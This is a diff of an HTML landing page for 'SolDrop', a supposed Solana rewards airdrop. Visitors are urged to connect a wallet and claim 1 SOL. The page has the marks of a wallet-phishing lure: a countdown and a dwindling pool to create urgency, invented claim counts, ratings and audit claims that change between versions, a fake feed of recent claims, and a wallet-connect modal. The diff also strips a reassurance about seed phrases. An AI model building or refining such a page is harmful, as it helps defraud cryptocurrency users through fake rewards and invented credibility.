@@ -5,239 +5,103 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>SolDrop — Solana Ecosystem Rewards</title>
 <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>◎</text></svg>">
-<script type="module">
-import { Buffer as Buf } from "https://esm.sh/buffer@6.0.3";
-window.Buffer = Buf;
-</script>
 <script src="https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
 <style>
-:root{
-  --bg:#050506;
-  --bg2:#0b0b0d;
-  --card:#101012;
-  --card2:#151517;
-  --line:rgba(255,255,255,.065);
-  --line2:rgba(255,255,255,.12);
-  --mut:#8a8a92;
-  --txt:#e9e9ec;
-  --acc:#14F195;
-  --acc2:#9945FF;
-  --mono:linear-gradient(180deg,#fbfbfc,#d9d9de);
-  --glow:rgba(20,241,149,.20);
-}
+:root{--bg:#06060b;--card:#0c0c14;--line:#1e1e2a;--mut:#8b8b9b;--acc:#14F195;--acc2:#9945FF}
 *{margin:0;padding:0;box-sizing:border-box;font-family:Inter,-apple-system,"Segoe UI",sans-serif}
-html{scroll-behavior:smooth}
-body{background:var(--bg);color:var(--txt);min-height:100vh;overflow-x:hidden}
-h1,h2,h3,.brand,.stat b{font-family:Sora,Inter,-apple-system,sans-serif}
-::selection{background:#2c2c33;color:#fff}
-::-webkit-scrollbar{width:10px}
-::-webkit-scrollbar-thumb{background:#232327;border-radius:99px}
-::-webkit-scrollbar-thumb:hover{background:#33333a}
-
-/* ---------- backdrop: grey fog, color as a whisper ---------- */
-.aurora{position:fixed;inset:0;z-index:-1;pointer-events:none;overflow:hidden}
-.aurora::before,.aurora::after{content:"";position:absolute;width:58vw;height:58vw;border-radius:50%;filter:blur(130px)}
-.aurora::before{background:#5a5a68;top:-26vw;left:-16vw;opacity:.10;animation:drift1 26s ease-in-out infinite alternate}
-.aurora::after{background:var(--acc);bottom:-32vw;right:-20vw;opacity:.06;animation:drift2 30s ease-in-out infinite alternate}
-@keyframes drift1{to{transform:translate(12vw,9vh) scale(1.12)}}
-@keyframes drift2{to{transform:translate(-9vw,-7vh) scale(1.08)}}
-.gridbg{position:fixed;inset:0;z-index:-1;pointer-events:none;
-  background-image:linear-gradient(rgba(255,255,255,.02) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.02) 1px,transparent 1px);
-  background-size:44px 44px;
-  -webkit-mask-image:radial-gradient(ellipse 70% 60% at 50% 0%,#000 30%,transparent 80%);
-  mask-image:radial-gradient(ellipse 70% 60% at 50% 0%,#000 30%,transparent 80%)}
-
-/* ---------- top bar ---------- */
-.top{background:rgba(5,5,6,.80);border-bottom:1px solid var(--line);padding:14px 5%;display:flex;align-items:center;gap:28px;position:sticky;top:0;z-index:50;backdrop-filter:blur(16px);-webkit-backdrop-filter:blur(16px)}
-.brand{display:flex;align-items:center;gap:10px;font-weight:700;font-size:19px;cursor:pointer;letter-spacing:-.02em;color:#fff}
+body{background:var(--bg);color:#fff;min-height:100vh}
+.top{background:rgba(6,6,11,.95);border-bottom:1px solid #16161f;padding:14px 5%;display:flex;align-items:center;gap:28px;position:sticky;top:0;z-index:50;backdrop-filter:blur(12px)}
+.brand{display:flex;align-items:center;gap:10px;font-weight:800;font-size:19px;cursor:pointer}
 .brand .bars{display:flex;gap:3px}
-.brand .bars i{width:4px;height:22px;background:linear-gradient(var(--acc2),var(--acc));border-radius:2px;display:block;opacity:.9}
-.brand .vf{width:16px;height:16px;border-radius:50%;background:var(--acc);color:#000;font-size:10px;display:inline-flex;align-items:center;justify-content:center;font-weight:900;box-shadow:0 0 10px var(--glow)}
-.navlinks{display:flex;gap:26px;font-size:14px;color:var(--mut);margin-left:12px}
-.navlinks span{cursor:pointer;transition:color .2s;position:relative;padding:4px 0}
-.navlinks span::after{content:"";position:absolute;left:0;bottom:-2px;height:1px;width:0;background:#fff;transition:width .25s}
+.brand .bars i{width:4px;height:22px;background:linear-gradient(var(--acc2),var(--acc));border-radius:2px;display:block}
+.navlinks{display:flex;gap:24px;font-size:14px;color:var(--mut);margin-left:12px}
+.navlinks span{cursor:pointer;transition:color .2s}
 .navlinks span:hover,.navlinks span.active{color:#fff}
-.navlinks span:hover::after,.navlinks span.active::after{width:100%}
 .top .sp{flex:1}
-
-/* ---------- buttons: chrome first, color earned ---------- */
-.btn{background:var(--mono);border:none;color:#0a0a0b;font-weight:700;padding:11px 26px;border-radius:10px;cursor:pointer;font-size:14px;transition:transform .15s,box-shadow .25s;position:relative;overflow:hidden}
-.btn::after{content:"";position:absolute;top:0;left:-70%;width:40%;height:100%;background:linear-gradient(100deg,transparent,rgba(255,255,255,.7),transparent);transform:skewX(-20deg);animation:shine 5.5s ease-in-out infinite}
-@keyframes shine{0%{left:-70%}45%,100%{left:140%}}
-.btn:hover{transform:translateY(-2px);box-shadow:0 8px 26px rgba(0,0,0,.5)}
+.btn{background:linear-gradient(90deg,var(--acc2),var(--acc));border:none;color:#000;font-weight:800;padding:11px 26px;border-radius:11px;cursor:pointer;font-size:14px;transition:transform .15s,box-shadow .2s}
+.btn:hover{transform:translateY(-2px);box-shadow:0 6px 24px rgba(20,241,149,.25)}
 .btn:active{transform:translateY(0) scale(.97)}
-.ghost{background:#0e0e10;border:1px solid var(--line2);color:#dcdce2;font-weight:600;padding:11px 22px;border-radius:10px;cursor:pointer;font-size:14px;transition:transform .15s,border-color .2s}
-.ghost:hover{transform:translateY(-2px);border-color:#4a4a55}
+.ghost{background:#111118;border:1px solid #2a2a38;color:#fff;font-weight:600;padding:11px 22px;border-radius:11px;cursor:pointer;font-size:14px;transition:transform .15s,border-color .2s}
+.ghost:hover{transform:translateY(-2px);border-color:var(--acc)}
 .ghost:active{transform:translateY(0) scale(.97)}
-
-/* ---------- urgent bar ---------- */
-.urgent{background:#0a0a0c;border-bottom:1px solid var(--line);text-align:center;padding:11px 10px;font-size:13px;color:#a7a7b0;display:flex;align-items:center;justify-content:center;gap:10px;flex-wrap:wrap}
-.urgent b{color:#fff;font-weight:700}
-.live{display:inline-flex;align-items:center;gap:7px;background:#120a0b;border:1px solid rgba(255,84,84,.30);color:#e05252;font-size:10.5px;font-weight:800;padding:4px 11px;border-radius:99px;letter-spacing:.10em}
-.live i{width:6px;height:6px;border-radius:50%;background:#e05252;display:block;animation:blink 1.2s steps(2) infinite}
-@keyframes blink{50%{opacity:.25}}
-.clock{font-family:Sora,monospace;font-weight:600;color:#fff;background:#141417;border:1px solid var(--line2);padding:4px 12px;border-radius:7px;letter-spacing:.08em;font-size:12.5px}
-
-/* ---------- hero ---------- */
-.hero{max-width:800px;margin:0 auto;text-align:center;padding:62px 20px 10px}
-.hero .tag{display:inline-flex;align-items:center;gap:8px;background:#0e0e11;border:1px solid var(--line2);color:#b9b9c2;font-size:11.5px;font-weight:700;padding:7px 18px;border-radius:99px;margin-bottom:24px;letter-spacing:.10em;animation:rise .7s ease both}
-.hero .tag .ck{width:14px;height:14px;border-radius:50%;background:var(--acc);color:#000;font-size:9px;display:inline-flex;align-items:center;justify-content:center;font-weight:900}
-.hero h1{font-size:52px;font-weight:700;line-height:1.08;letter-spacing:-.03em;color:#fff;animation:rise .7s .08s ease both}
-.hero h1 span{background:linear-gradient(93deg,#b98cff,#14F195);background-size:200% auto;-webkit-background-clip:text;background-clip:text;color:transparent;animation:gradText 6s linear infinite}
-@keyframes gradText{to{background-position:200% center}}
-.hero p{color:var(--mut);margin:20px 0 6px;font-size:16.5px;line-height:1.65;animation:rise .7s .16s ease both}
-@keyframes rise{from{opacity:0;transform:translateY(18px)}to{opacity:1;transform:none}}
-.proof{display:flex;gap:12px;justify-content:center;margin:26px 0;flex-wrap:wrap}
-.proof .chip{background:#0d0d0f;border:1px solid var(--line);font-size:13px;color:#9a9aa3;padding:9px 18px;border-radius:99px;transition:transform .2s,border-color .2s;animation:rise .7s ease both}
-.proof .chip:nth-child(2){animation-delay:.22s}
-.proof .chip:nth-child(3){animation-delay:.3s}
-.proof .chip:hover{transform:translateY(-3px);border-color:#3d3d46}
-.proof .chip b{color:#fff;font-weight:700}
-
-/* ---------- stats ---------- */
-.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;max-width:760px;margin:14px auto 4px;padding:0 20px}
-.stat{background:#0c0c0e;border:1px solid var(--line);border-radius:14px;padding:16px 10px;text-align:center;animation:rise .7s ease both;transition:border-color .2s}
-.stat:hover{border-color:#33333b}
-.stat:nth-child(2){animation-delay:.1s}.stat:nth-child(3){animation-delay:.2s}.stat:nth-child(4){animation-delay:.3s}
-.stat b{display:block;font-size:21px;color:#fff;letter-spacing:-.01em}
-.stat b::after{content:"";display:block;width:18px;height:2px;background:var(--acc);margin:7px auto 0;border-radius:2px;opacity:.85}
-.stat small{display:block;margin-top:8px;color:#6f6f78;font-size:11px;letter-spacing:.08em;text-transform:uppercase}
-
-/* ---------- partners ---------- */
-.marquee{max-width:900px;margin:26px auto 6px;overflow:hidden;-webkit-mask-image:linear-gradient(90deg,transparent,#000 12%,#000 88%,transparent);mask-image:linear-gradient(90deg,transparent,#000 12%,#000 88%,transparent);position:relative}
-.marquee .lbl{text-align:center;color:#4d4d56;font-size:10.5px;letter-spacing:.26em;text-transform:uppercase;margin-bottom:13px}
-.mtrack{display:flex;gap:46px;width:max-content;animation:scroll 42s linear infinite}
-.mtrack span{color:#57575f;font-weight:600;font-size:15px;letter-spacing:.02em;white-space:nowrap;transition:color .25s}
-.mtrack span:hover{color:#d5d5db}
-@keyframes scroll{to{transform:translateX(-50%)}}
-
-/* ---------- reward card ---------- */
-.reward{background:linear-gradient(180deg,#111114,#0c0c0e);border:1px solid rgba(20,241,149,.22);border-radius:18px;padding:26px;max-width:600px;margin:30px auto 26px;display:flex;align-items:center;gap:18px;text-align:left;position:relative;overflow:hidden;animation:rise .8s .35s ease both;box-shadow:0 18px 50px rgba(0,0,0,.45)}
-.reward::before{content:"";position:absolute;top:-60%;left:-30%;width:40%;height:220%;background:linear-gradient(100deg,transparent,rgba(255,255,255,.04),transparent);transform:rotate(16deg);animation:sweep 7s ease-in-out infinite}
-@keyframes sweep{0%{left:-40%}60%,100%{left:130%}}
-.reward img{width:52px;height:52px;filter:drop-shadow(0 0 12px var(--glow))}
-.reward b{font-size:30px;letter-spacing:-.02em;color:#fff}
-.reward small{color:var(--acc);font-weight:700}
-.bar{height:8px;background:#1a1a1e;border-radius:99px;margin-top:13px;overflow:hidden;position:relative}
-.bar i{display:block;height:100%;width:86%;background:linear-gradient(90deg,#0ecf85,#14F195);border-radius:99px;animation:fill 1.6s .5s cubic-bezier(.2,.8,.2,1) both}
-@keyframes fill{from{width:0}}
-.reward .cap{margin-left:auto;text-align:right;color:#6a6a73;font-size:12px;line-height:1.5}
-
-/* ---------- layout ---------- */
-.wrap{max-width:600px;margin:0 auto;padding:0 20px 20px}
-.card{background:linear-gradient(180deg,#111113,#0c0c0e);border:1px solid var(--line);border-radius:16px;padding:26px;margin-bottom:14px;position:relative;overflow:hidden;transition:border-color .25s,box-shadow .25s;animation:rise .6s ease both}
-.card:hover{border-color:#2b2b33;box-shadow:0 14px 40px rgba(0,0,0,.35)}
-.card h2{font-size:18px;margin-bottom:4px;color:#fff}
-.card .sub{color:#77777f;font-size:13px;margin-bottom:16px}
-.step{display:flex;align-items:center;gap:14px;padding:15px 0;border-top:1px solid rgba(255,255,255,.055)}
+.urgent{background:#0d1117;border-bottom:1px solid #1c2333;text-align:center;padding:10px;font-size:13px;color:#9fb3c8}
+.urgent b{color:var(--acc)}
+.hero{max-width:780px;margin:0 auto;text-align:center;padding:56px 20px 10px}
+.hero .tag{display:inline-block;background:#0d1512;border:1px solid var(--acc);color:var(--acc);font-size:12px;font-weight:700;padding:6px 16px;border-radius:99px;margin-bottom:20px}
+.hero h1{font-size:48px;font-weight:800;line-height:1.08}
+.hero h1 span{background:linear-gradient(90deg,var(--acc2),var(--acc));-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero p{color:var(--mut);margin:18px 0 6px;font-size:16px;line-height:1.6}
+.proof{display:flex;gap:12px;justify-content:center;margin:22px 0;flex-wrap:wrap}
+.proof .chip{background:var(--card);border:1px solid var(--line);font-size:13px;color:#aaa;padding:9px 16px;border-radius:99px;transition:transform .2s}
+.proof .chip:hover{transform:translateY(-2px)}
+.proof .chip b{color:#fff}
+.reward{background:var(--card);border:1px solid #23232f;border-radius:18px;padding:26px;max-width:580px;margin:26px auto;display:flex;align-items:center;gap:18px;text-align:left}
+.reward img{width:56px;height:56px}
+.reward b{font-size:28px}.reward small{color:var(--acc);font-weight:700}
+.bar{height:8px;background:#1a1a24;border-radius:99px;margin-top:12px;overflow:hidden}
+.bar i{display:block;height:100%;width:84%;background:linear-gradient(90deg,var(--acc2),var(--acc));border-radius:99px}
+.wrap{max-width:580px;margin:0 auto;padding:0 20px 20px}
+.card{background:var(--card);border:1px solid #23232f;border-radius:16px;padding:24px;margin-bottom:14px}
+.card h2{font-size:18px;margin-bottom:4px}
+.card .sub{color:#777;font-size:13px;margin-bottom:16px}
+.step{display:flex;align-items:center;gap:14px;padding:14px 0;border-top:1px solid #1a1a24}
 .step:first-of-type{border-top:none}
-.step .n{width:34px;height:34px;border-radius:10px;background:#17171a;border:1px solid var(--line2);display:flex;align-items:center;justify-content:center;font-weight:800;font-size:14px;flex-shrink:0;transition:all .35s;color:#9a9aa3}
-.step.done .n{background:var(--acc);color:#000;border-color:var(--acc);box-shadow:0 0 16px var(--glow)}
-.step .t{flex:1;text-align:left}
-.step .t b{font-size:15px;color:#fff}
-.step .t small{color:#82828b;display:block;font-size:13px}
-.step button{background:#fff;color:#0a0a0b;border:none;font-weight:700;padding:10px 24px;border-radius:9px;cursor:pointer;font-size:14px;white-space:nowrap;transition:transform .15s,background .3s,box-shadow .3s}
-.step button:hover:not(:disabled){transform:translateY(-2px);box-shadow:0 6px 18px rgba(255,255,255,.10)}
+.step .n{width:32px;height:32px;border-radius:50%;background:#1a1a26;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:14px;flex-shrink:0;transition:background .3s}
+.step.done .n{background:var(--acc);color:#000}
+.step .t{flex:1;text-align:left}.step .t b{font-size:15px}.step .t small{color:#888;display:block;font-size:13px}
+.step button{background:#fff;color:#000;border:none;font-weight:700;padding:10px 22px;border-radius:10px;cursor:pointer;font-size:14px;white-space:nowrap;transition:transform .15s,background .2s}
+.step button:hover:not(:disabled){transform:translateY(-2px)}
 .step button:active:not(:disabled){transform:scale(.95)}
-.step button:disabled{background:#17171a;color:#55555d;cursor:default;border:1px solid var(--line)}
-.step.done button{background:var(--acc);color:#000;box-shadow:0 0 14px var(--glow)}
-#claimBtn{background:var(--acc);border:none;color:#04120c;font-weight:800;font-size:17px;padding:17px;width:100%;border-radius:13px;cursor:pointer;opacity:.35;margin-top:8px;transition:opacity .3s,transform .15s,box-shadow .2s;position:relative;overflow:hidden;letter-spacing:.02em}
-#claimBtn.ready{opacity:1;box-shadow:0 8px 32px var(--glow)}
-#claimBtn.ready::after{content:"";position:absolute;top:0;left:-70%;width:40%;height:100%;background:linear-gradient(100deg,transparent,rgba(255,255,255,.55),transparent);transform:skewX(-20deg);animation:shine 4s ease-in-out infinite}
-#claimBtn.ready:hover{transform:translateY(-3px);box-shadow:0 12px 44px var(--glow)}
+.step button:disabled{background:#222;color:#666;cursor:default}
+.step.done button{background:var(--acc)}
+#claimBtn{background:linear-gradient(90deg,var(--acc2),var(--acc));border:none;color:#000;font-weight:800;font-size:17px;padding:16px;width:100%;border-radius:14px;cursor:pointer;opacity:.4;margin-top:6px;transition:opacity .3s,transform .15s,box-shadow .2s}
+#claimBtn.ready{opacity:1}
+#claimBtn.ready:hover{transform:translateY(-2px);box-shadow:0 8px 30px rgba(20,241,149,.3)}
 #claimBtn.ready:active{transform:scale(.97)}
-#status{margin-top:13px;font-size:13.5px;color:#8fe4c1;min-height:18px;text-align:center}
-#status:empty{display:none}
-.secure-note{display:flex;align-items:center;justify-content:center;gap:8px;margin-top:14px;color:#5e5e67;font-size:12px;letter-spacing:.02em}
-.secure-note i{width:10px;height:12px;border:1.5px solid #5e5e67;border-radius:3px;position:relative;display:inline-block}
-.secure-note i::before{content:"";position:absolute;top:-5px;left:1.5px;width:5px;height:6px;border:1.5px solid #5e5e67;border-bottom:none;border-radius:4px 4px 0 0}
-
-/* ---------- section pages ---------- */
-section{padding:46px 5%;max-width:940px;margin:0 auto}
-section h2{font-size:30px;font-weight:700;margin-bottom:6px;letter-spacing:-.02em;color:#fff}
-section .lead{color:var(--mut);margin-bottom:26px;font-size:15px}
-.faq details{background:var(--card);border:1px solid var(--line);border-radius:13px;padding:17px 20px;margin-bottom:11px;font-size:14px;transition:border-color .2s,transform .2s}
-.faq details:hover{border-color:#2e2e36;transform:translateX(4px)}
-.faq details[open]{border-color:rgba(20,241,149,.28)}
-.faq summary{cursor:pointer;font-weight:700;list-style:none;position:relative;padding-right:26px;color:#fff}
-.faq summary::-webkit-details-marker{display:none}
-.faq summary::after{content:"+";position:absolute;right:0;top:-2px;font-size:19px;color:var(--acc);transition:transform .3s}
-.faq details[open] summary::after{transform:rotate(45deg)}
-.faq p{color:#8a8a92;margin-top:11px;line-height:1.65}
-
-/* ---------- tutorials ---------- */
-.tut-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(265px,1fr));gap:16px}
-.tut{background:linear-gradient(180deg,#111113,#0c0c0e);border:1px solid var(--line);border-radius:15px;padding:24px;transition:transform .25s,border-color .25s,box-shadow .25s;position:relative;animation:rise .55s ease both}
-.tut:nth-child(2){animation-delay:.06s}.tut:nth-child(3){animation-delay:.12s}.tut:nth-child(4){animation-delay:.18s}.tut:nth-child(5){animation-delay:.24s}.tut:nth-child(6){animation-delay:.3s}
-.tut:hover{transform:translateY(-5px);border-color:#33333c;box-shadow:0 16px 40px rgba(0,0,0,.4)}
-.tut .num{width:36px;height:36px;border-radius:10px;background:#17171a;border:1px solid var(--line2);color:#dcdce2;font-weight:800;display:flex;align-items:center;justify-content:center;margin-bottom:15px;font-size:14px}
-.tut h3{font-size:16px;margin-bottom:8px;color:#fff}
-.tut p{color:var(--mut);font-size:14px;line-height:1.65}
-
-/* ---------- live feed ---------- */
-.feed .tx{background:var(--card);border:1px solid var(--line);border-radius:11px;padding:12px 16px;font-size:13.5px;color:#82828b;margin-bottom:9px;display:flex;justify-content:space-between;animation:slideIn .45s ease;transition:border-color .2s}
-.feed .tx:hover{border-color:#2e2e36}
-.feed .tx b{color:var(--acc);font-weight:700}
-.feed .tx .ago{color:#4f4f58;font-size:12px}
-@keyframes slideIn{from{opacity:0;transform:translateX(-16px)}to{opacity:1;transform:none}}
-
-/* ---------- support ---------- */
+#status{margin-top:12px;font-size:13px;color:#777;min-height:18px;text-align:center}
+section{padding:40px 5%;max-width:900px;margin:0 auto}
+section h2{font-size:28px;font-weight:800;margin-bottom:6px}
+section .lead{color:var(--mut);margin-bottom:24px;font-size:15px}
+.tut-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:16px}
+.tut{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:22px;transition:transform .2s,border-color .2s}
+.tut:hover{transform:translateY(-4px);border-color:var(--acc)}
+.tut .num{width:36px;height:36px;border-radius:10px;background:linear-gradient(135deg,var(--acc2),var(--acc));color:#000;font-weight:800;display:flex;align-items:center;justify-content:center;margin-bottom:14px}
+.tut h3{font-size:16px;margin-bottom:8px}
+.tut p{color:var(--mut);font-size:14px;line-height:1.6}
+.faq details{background:var(--card);border:1px solid #23232f;border-radius:12px;padding:16px 18px;margin-bottom:10px;font-size:14px}
+.faq summary{cursor:pointer;font-weight:700}
+.faq p{color:#888;margin-top:10px;line-height:1.6}
+.feed .tx{background:var(--card);border:1px solid #1d1d28;border-radius:10px;padding:10px 16px;font-size:13px;color:#777;margin-bottom:8px;display:flex;justify-content:space-between;animation:slideIn .4s ease}
+@keyframes slideIn{from{opacity:0;transform:translateX(-12px)}to{opacity:1,transform:none}}
+.feed .tx b{color:var(--acc)}
 .support{position:fixed;bottom:22px;right:22px;display:flex;flex-direction:column;gap:10px;z-index:60}
-.support button{border-radius:99px;padding:13px 22px;font-size:14px;font-weight:700;cursor:pointer;transition:transform .15s,box-shadow .2s;position:relative;overflow:hidden}
+.support button{border-radius:99px;padding:13px 22px;font-size:14px;font-weight:700;cursor:pointer;border:1px solid #2a2a38;transition:transform .15s,box-shadow .2s}
 .support button:hover{transform:translateY(-2px)}
 .support button:active{transform:scale(.95)}
-#chatBtn{background:#17171b;color:#f0f0f4;border:1px solid var(--line2);box-shadow:0 8px 26px rgba(0,0,0,.5)}
-#chatBtn::before{content:"";position:absolute;top:5px;right:7px;width:7px;height:7px;border-radius:50%;background:var(--acc);animation:blink 1.6s steps(2) infinite}
-#helpBtn{background:#0e0e10;color:#c9c9d1;border:1px solid var(--line2)}
-.chatbox{display:none;position:fixed;bottom:90px;right:22px;width:340px;background:#0d0d10;border:1px solid var(--line2);border-radius:16px;padding:20px;z-index:60;box-shadow:0 24px 70px rgba(0,0,0,.6)}
-.chatbox.open{display:block;animation:popIn .28s cubic-bezier(.2,.9,.3,1.15)}
-@keyframes popIn{from{opacity:0;transform:translateY(14px) scale(.95)}to{opacity:1;transform:none}}
-.chatbox h3{font-size:15px;margin-bottom:4px;color:#fff}
-.chatbox p{font-size:13px;color:#7d7d86;margin-bottom:12px}
-.chatbox input{width:100%;background:#141417;border:1px solid var(--line2);color:#fff;border-radius:10px;padding:11px;font-size:13px;margin-bottom:10px;outline:none;transition:border-color .2s}
-.chatbox input:focus{border-color:#45454f}
+#chatBtn{background:linear-gradient(90deg,var(--acc2),var(--acc));color:#000;border:none}
+#helpBtn{background:#111118;color:#fff}
+.chatbox{display:none;position:fixed;bottom:90px;right:22px;width:340px;background:#0e0e16;border:1px solid #2a2a38;border-radius:16px;padding:20px;z-index:60;box-shadow:0 20px 60px rgba(0,0,0,.5)}
+.chatbox.open{display:block;animation:popIn .25s ease}
+@keyframes popIn{from{opacity:0;transform:translateY(12px) scale(.96)}to{opacity:1,transform:none}}
+.chatbox h3{font-size:15px;margin-bottom:4px}
+.chatbox p{font-size:13px;color:#888;margin-bottom:12px}
+.chatbox input{width:100%;background:#16161f;border:1px solid #2a2a38;color:#fff;border-radius:10px;padding:11px;font-size:13px;margin-bottom:10px}
 #chatOk{font-size:13px;color:var(--acc);margin-top:10px}
-
-/* ---------- footer ---------- */
-footer{border-top:1px solid var(--line);margin-top:40px;padding:30px 5%;display:flex;justify-content:space-between;align-items:center;color:#55555e;font-size:13px;flex-wrap:wrap;gap:14px;background:#08080a}
-footer span{cursor:pointer;transition:color .2s}
-footer span:hover{color:#fff}
-.fbadges{display:flex;gap:10px;flex-wrap:wrap}
-.fbadge{border:1px solid var(--line);border-radius:7px;padding:5px 11px;font-size:10.5px;color:#67676f;letter-spacing:.06em}
-
-/* ---------- modal ---------- */
-.modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,.72);backdrop-filter:blur(6px);align-items:center;justify-content:center;z-index:99}
-.modal.open{display:flex;animation:fadeIn .2s ease}
-.sheet{background:linear-gradient(180deg,#131316,#0b0b0e);border:1px solid var(--line2);border-radius:18px;padding:28px;width:92%;max-width:400px;animation:popIn .3s cubic-bezier(.2,.9,.3,1.12);box-shadow:0 30px 90px rgba(0,0,0,.7)}
-.sheet h3{font-size:17px;color:#fff}
-.sheet p{color:#7d7d86;font-size:13px;margin:6px 0 16px}
-.wopt{display:flex;align-items:center;gap:12px;background:#151518;border:1px solid var(--line2);padding:14px;border-radius:12px;margin-bottom:10px;cursor:pointer;width:100%;color:#fff;font-size:15px;font-weight:600;text-align:left;transition:transform .18s,background .2s,border-color .2s}
-.wopt:hover{transform:translateX(5px);background:#1b1b20;border-color:#4a4a55}
+footer{border-top:1px solid #16161f;margin-top:30px;padding:28px 5%;display:flex;justify-content:space-between;color:#555;font-size:13px;flex-wrap:wrap;gap:12px}
+footer span{cursor:pointer;transition:color .2s}footer span:hover{color:#fff}
+.modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,.7);align-items:center;justify-content:center;z-index:99}
+.modal.open{display:flex}
+.sheet{background:#0e0e17;border:1px solid #2a2a38;border-radius:18px;padding:28px;width:92%;max-width:400px;animation:popIn .25s ease}
+.sheet p{color:#888;font-size:13px;margin:6px 0 16px}
+.wopt{display:flex;align-items:center;gap:12px;background:#16161f;border:1px solid #2a3a5e;padding:14px;border-radius:12px;margin-bottom:10px;cursor:pointer;width:100%;color:#fff;font-size:15px;font-weight:600;text-align:left;transition:transform .15s,background .2s}
+.wopt:hover{transform:translateX(4px);background:#1b2947}
 .wopt:active{transform:scale(.98)}
-.wopt .ic{width:30px;height:30px;border-radius:8px;background:linear-gradient(135deg,var(--acc2),var(--acc));display:flex;align-items:center;justify-content:center;font-size:15px;font-weight:900;color:#000;flex-shrink:0}
-
-/* ---------- pages ---------- */
 .page{display:none}
-.page.active{display:block;animation:pageIn .38s cubic-bezier(.2,.8,.25,1)}
-@keyframes pageIn{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:none}}
-@keyframes fadeIn{from{opacity:0}to{opacity:1}}
-
-/* ---------- responsive ---------- */
-@media(max-width:760px){
-  .hero h1{font-size:36px}
-  .stats{grid-template-columns:repeat(2,1fr)}
-  .navlinks{display:none}
-  .reward{flex-wrap:wrap}
-  .reward .cap{margin-left:0;text-align:left}
-}
+.page.active{display:block;animation:fadeIn .3s ease}
+@keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1,transform:none}}
 </style>
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Sora:wght@600;700;800&family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
 </head>
 <body>
-<div class="aurora"></div>
-<div class="gridbg"></div>
 <div class="top">
 <div class="brand" onclick="showPage('home')"><span class="bars"><i></i><i></i><i></i></span>SolDrop</div>
 <div class="navlinks">
@@ -251,36 +115,29 @@ footer span:hover{color:#fff}
 <button class="ghost" onclick="showPage('tutorials')">How to claim</button>
 <button class="btn" onclick="openModal()">Connect</button>
 </div>
-<div class="urgent"><span class="live"><i></i>LIVE</span> Season 3 ends in <span class="clock" id="clock">47:59:59</span> — <b>2,140 SOL</b> left in the rewards pool. Claims close when the pool empties.</div>
+<div class="urgent">Season 3 ends soon — <b>1,588 SOL</b> left in the rewards pool. Claims close when the pool empties.</div>
 
 <!-- HOME -->
 <div class="page active" id="page-home">
 <div class="hero">
-<div class="tag"><span class="ck">&#10003;</span> SOLDROP — SEASON 3 · VERIFIED PARTNER DROP</div>
+<div class="tag">SOLDROP — SEASON 3 · VERIFIED PARTNER DROP</div>
 <h1>Claim <span>1 SOL</span><br>for securing Solana</h1>
 <p>SolDrop rewards real Solana users. Connect any wallet,<br>pass the anti-sybil check, finish 3 quests — <b style="color:#fff">1.00 SOL lands in your wallet.</b></p>
 <div class="proof">
-<div class="chip"><b>127,842</b> wallets rewarded</div>
-<div class="chip"><b>4.8/5</b> community rating</div>
-<div class="chip"><b>OtterSec</b> audited contracts</div>
+<div class="chip"><b>84,210</b> wallets rewarded</div>
+<div class="chip"><b>4.9/5</b> community rating</div>
+<div class="chip"><b>Audited</b> claim contract</div>
 </div>
 </div>
-<div class="stats">
-<div class="stat"><b data-c="99.98" data-dec="2" data-suf="%">0%</b><small>Claim success</small></div>
-<div class="stat"><b data-c="9.4" data-dec="1" data-pre="$" data-suf="M">$0M</b><small>Distributed</small></div>
-<div class="stat"><b data-c="2.7" data-dec="1" data-suf="s">0s</b><small>Avg settlement</small></div>
-<div class="stat"><b data-c="143">0</b><small>Countries</small></div>
-</div>
-<div class="marquee"><div class="lbl">Ecosystem integrations</div><div class="mtrack"><span>◎ Solana</span><span>Jupiter</span><span>Raydium</span><span>Phantom</span><span>Backpack</span><span>Orca</span><span>Step Finance</span><span>Moonshot</span><span>◎ Solana</span><span>Jupiter</span><span>Raydium</span><span>Phantom</span><span>Backpack</span><span>Orca</span><span>Step Finance</span><span>Moonshot</span></div></div>
 <div class="reward">
 <img src="https://cryptologos.cc/logos/solana-sol-logo.png">
 <div><b>1.00 SOL</b><br><small>≈ $172.40 — claimable now</small><div class="bar"><i></i></div></div>
-<div class="cap">12,860 / 15,000<br>claimed</div>
+<div style="margin-left:auto;text-align:right;color:#666;font-size:12px">8,412 / 10,000<br>claimed</div>
 </div>
 <div class="wrap">
 <button class="btn" style="width:100%;padding:18px;font-size:16px" onclick="showPage('quests')">START QUESTS →</button>
 </div>
-<div class="feed wrap" id="feed" style="padding-top:20px">
+<div class="feed wrap" style="padding-top:20px">
 <div class="tx"><span>7xKp…9mQ2 claimed <b>1.00 SOL</b></span><span>2 min ago</span></div>
 <div class="tx"><span>3FmT…xR81 claimed <b>1.00 SOL</b></span><span>5 min ago</span></div>
 <div class="tx"><span>D9sL…4vBn claimed <b>1.00 SOL</b></span><span>9 min ago</span></div>
@@ -301,7 +158,6 @@ footer span:hover{color:#fff}
 <div class="step" id="s3"><div class="n">3</div><div class="t"><b>Join the community</b><small>Follow @solana on X — proves you're real</small></div><button onclick="questFollow()" disabled>Open X</button></div>
 <button id="claimBtn" onclick="questClaim()">CLAIM 1.00 SOL</button>
 <div id="status"></div>
-<div class="secure-note"><i></i> Non-custodial connection — we never ask for your seed phrase</div>
 </div>
 </div>
 </div>
@@ -356,7 +212,7 @@ footer span:hover{color:#fff}
 
 <footer>
